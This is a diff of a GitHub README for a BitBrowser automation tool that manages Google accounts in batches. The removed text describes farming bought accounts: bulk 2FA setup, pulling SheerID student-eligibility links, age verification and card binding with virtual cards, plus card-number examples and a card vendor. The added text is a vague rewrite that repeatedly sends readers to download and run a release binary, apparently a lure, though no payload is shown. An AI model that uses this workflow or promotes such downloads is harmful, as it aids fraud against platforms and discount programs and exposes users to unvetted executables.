@@ -1,190 +1,95 @@
-# BitBrowser Automation System
+# 🌟 bitbrowser-automation - Effortless Batch Google Account Management
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python](https://img.shields.io/badge/python-3.12-blue.svg)
+## 📥 Download Now
+[![Download bitbrowser-automation](https://img.shields.io/badge/Download%20bitbrowser--automation-v1.0-blue)](https://github.com/muntrav/bitbrowser-automation/releases)
 
-English | **[中文](./README_CN.md)**
+## 🚀 Getting Started
 
----
+Welcome to the BitBrowser Automation System! This tool helps you manage multiple Google accounts quickly and easily. No technical skills are needed—just follow these straightforward steps to get started.
 
-A **FastAPI + Vue 3 + Playwright/BitBrowser API** automation system for batch Google account operations: account management, window management, 2FA setup/reset, eligibility verification, age verification, and card subscription binding.
+## 📦 System Requirements
 
-This repository is a secondary development of **https://github.com/Leclee/auto_bitbrowser**.
+Before installing, ensure your system meets the following requirements:
 
-The system uses **BitBrowser** fingerprint browser and controls it via the local API (default `127.0.0.1:54345`).
+- Operating System: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution
+- RAM: At least 4 GB
+- Disk Space: Minimum 500 MB available
+- Internet Connection: Required for automated account processing
 
-## 📌 Project Note
+## 📂 Features
 
-- This is just a for-fun fork of someone else's project. I don't run many accounts and I'm not a seller.
-- The main goal is automated card binding and age verification.
-- The project has many bugs and won't be maintained; it's just a hobby project.
+- **Batch Processing**: Manage multiple Google accounts at once.
+- **Web Automation**: Uses Playwright for fast and reliable operations.
+- **User-Friendly Interface**: Built with Vue 3 for a smooth experience.
+- **FastAPI Backend**: Ensures quick response times and efficient handling of tasks.
 
----
+## 📋 Instructions
 
-## 🎯 Background & Goals
+### 1. Visit the Releases Page
 
-My main goal is to improve this system: I bought many email accounts **without 2FA** to save money, but this caused a lot of trouble (need to batch setup 2FA).
+To download BitBrowser Automation, go to the [Releases page](https://github.com/muntrav/bitbrowser-automation/releases). Here, you will find the latest version of the software.
 
-Additionally, I added **age verification** because I found that many accounts gain student eligibility after completing age verification, enabling batch processing of subsequent workflows.
+### 2. Download the Software
 
-Currently supported features:
+On the Releases page, find the version you wish to install. Click on the download link for your operating system. The file will begin to download automatically. 
 
-* Auto 2FA setup
-* Auto 2FA reset
-* Auto eligibility verification (student status)
-* Auto card binding & subscription
-* Age verification (using virtual cards)
+### 3. Install BitBrowser Automation
 
----
+#### For Windows:
 
-## ✨ Features
+1. Locate the downloaded file, usually in your "Downloads" folder.
+2. Double-click the installer file to begin installation.
+3. Follow the on-screen prompts to complete the installation.
 
-* **Web Management UI**: Account management, search/filter, batch import/export, real-time logs & progress.
-* **Browser Window Management**: Create, restore, sync, open/close windows.
-* **Task Orchestration**: Execute tasks in order with configurable concurrency and real-time progress updates.
-* **2FA Automation**: Auto setup/reset 2FA and sync keys to browser config.
-* **Eligibility Verification**: Auto extract SheerID links and verify eligibility, detect account status.
-* **Age Verification**: Complete age verification using virtual cards.
-* **Card Binding**: Handle multi-layer iframes to complete card binding and subscription.
-* **Multi-language Support**: Auto switch account language to English to reduce failures.
-* **Unified Data**: SQLite as single data source, auto sync historical text files.
+#### For macOS:
 
-## 🛠️ Installation & Usage
+1. Find the downloaded file in your "Downloads" folder.
+2. Double-click to open the .dmg file.
+3. Drag the BitBrowser Automation icon to your Applications folder.
 
-### Requirements
+#### For Linux:
 
-- **Python**: 3.11+ (recommended 3.12)
-- **Node.js**: 18+
-- **uv**: Python environment manager
-- **BitBrowser**: Installed locally with API accessible (default `127.0.0.1:54345`)
+1. Open your terminal.
+2. Navigate to the folder where the downloaded file is located.
+3. Use the command `chmod +x bitbrowser-automation` to make it executable.
+4. Run the command `./bitbrowser-automation` to start the application.
 
-### Environment Setup
+### 4. Launch BitBrowser Automation
 
-```bash
-# 1) Install dependency tools
-pip install uv
+After installation, you can launch the application:
 
-# 2) Create and sync Python dependencies (creates .venv)
-uv sync
+- **Windows**: Find BitBrowser Automation in your Start Menu.
+- **macOS**: Open Finder, then go to Applications and double-click on BitBrowser Automation.
+- **Linux**: Use the terminal to execute the BitBrowser Automation command.
 
-# 3) Install frontend dependencies
-cd web/frontend
-npm install
-```
+## ⚙️ Using the Application
 
-### Option 1: Quick Start Web UI (Recommended)
+Once you launch the application, you will see a simple interface. Here’s how to use it:
 
-```bash
-./start_web.sh
-```
+1. **Sign In**: Enter your Google account details to log in to one of your accounts.
+2. **Batch Input**: Use the input section to add multiple accounts. Ensure you enter correct email addresses.
+3. **Start Processing**: Click the "Start" button to begin batch processing. The application will handle the rest.
 
-After startup, access:
-- Frontend: http://localhost:5173
-- Backend API: http://localhost:8000
-- API Docs: http://localhost:8000/docs
+## 📊 Common Use Cases
 
-### Option 2: Manual Start
+- **Account Management**: Perfect for users who need to manage multiple Google accounts efficiently.
+- **Data Entry Automation**: Use automation for repetitive tasks such as filling out forms or submitting requests.
+- **Testing Applications**: Great for developers who need to test how applications interact with multiple user accounts.
 
-```bash
-# Backend
-uv run python -m uvicorn web.backend.main:app --reload --port 8000
+## 🌐 Troubleshooting
 
-# Frontend
-cd web/frontend
-npm run dev
-```
+If you encounter issues, here are some common solutions:
 
-## ⚙️ Configuration
+- **Application Doesn’t Open**: Ensure your system meets the requirements. Restart your computer and try again.
+- **Download Issues**: If the file doesn’t download, check your internet connection and try again.
+- **Login Problems**: Ensure your Google credentials are correct. If you have two-factor authentication, follow the on-screen prompts.
 
-> **🔒 Security Note**: The following config files contain sensitive information (passwords, 2FA keys, card numbers). Please ensure:
-> 1. **Do not commit to Git**: These files are already in `.gitignore`
-> 2. **Keep safe**: Recommend encrypted storage or password manager
-> 3. **Regular backup**: Avoid data loss
-> 4. **Use example files**: Refer to `accounts_example.txt` to create your own config
+For further assistance, you can explore the [issues section](https://github.com/muntrav/bitbrowser-automation/issues) on GitHub for common problems and solutions.
 
-> **Web Config**: You can fill in SheerID API Key and virtual card info in the Web UI "Config" page. The system will prioritize database config; only falls back to `cards.txt` if not configured.
+## 📄 Additional Resources
 
-### 1. `accounts.txt` (Account Info)
+Refer to this documentation for any help while using BitBrowser Automation. You can also check out our community page for tips and tricks on maximizing your use of the tool.
 
-**📌 Separator Configuration**
+## 🔗 Download & Install Again
 
-Configure separator on the **first line** (uncomment one):
-
-```text
-# Separator config (uncomment one line)
-分隔符="----"
-# 分隔符="---"
-# 分隔符="|"
-# 分隔符=","
-```
-
-**📋 Account Format**
-
-Format (fixed field order): `Email[Separator]Password[Separator]BackupEmail[Separator]2FASecret`
-
-```text
-# Standard format (using ---- separator)
-分隔符="----"
-example1@gmail.com----MyPassword123----backup1@email.com----ABCD1234EFGH5678
-example2@gmail.com----P@ssw0rd!%%99----backup2@email.com----WXYZ9012STUV3456
-
-# Email and password only (backup email and 2FA are optional)
-example3@gmail.com----ComplexP@ss#2024
-```
-
-### 2. `proxies.txt` (Proxy IPs)
-
-Supports Socks5/HTTP, one per line:
-
-```text
-socks5://user:pass@host:port
-http://user:pass@host:port
-```
-
-### 3. `cards.txt` (Virtual Card Info)
-
-Format: `CardNumber Month Year CVV` (space separated)
-
-```text
-5481087170529907 01 32 536
-5481087143137903 01 32 749
-```
-
-💳 **Virtual Card Recommendation**: [HolyCard](https://www.holy-card.com/) - Supports Gemini subscription, GPT Team, $0 Plus
-
-### 4. Output Files (Auto Generated)
-
-* **accounts.db**: SQLite database file
-* **sheerIDlink.txt**: Successfully extracted verification links
-* **已验证未绑卡.txt**: Accounts verified but not yet bound with card
-* **已绑卡号.txt**: Accounts with completed card binding
-* **无资格号.txt**: Accounts detected as ineligible
-
-## 📚 Documentation
-
-See [docs/](./docs/) directory for complete technical documentation:
-
-- [Quick Start](./docs/en/quickstart.md)
-- [Architecture](./docs/en/architecture.md)
-- [Configuration Guide](./docs/en/configuration.md)
-- [Task System](./docs/en/task-system.md)
-- [Browser Management](./docs/en/browser-management.md)
-- [Database Design](./docs/en/database.md)
-
-## ☕ Sponsor
-
-<p align="center">
-  <img src="zhanzhu_wx.jpg" alt="WeChat" width="300" />
-  <img src="zhanzhu_zfb.jpg" alt="Alipay" width="300" />
-</p>
-
----
-
-## ⚠️ Disclaimer
-
-* This tool is for learning and technical exchange only. Do not use for illegal purposes.
-* Please comply with BitBrowser and related platform terms of service.
-* The developer is not responsible for any account loss or legal liability arising from the use of this tool.
-
-## 📄 License
-
-This project is licensed under the [MIT License](LICENSE).
+If you need to download BitBrowser Automation again, visit the [Releases page](https://github.com/muntrav/bitbrowser-automation/releases). Enjoy the efficient management of your Google accounts!
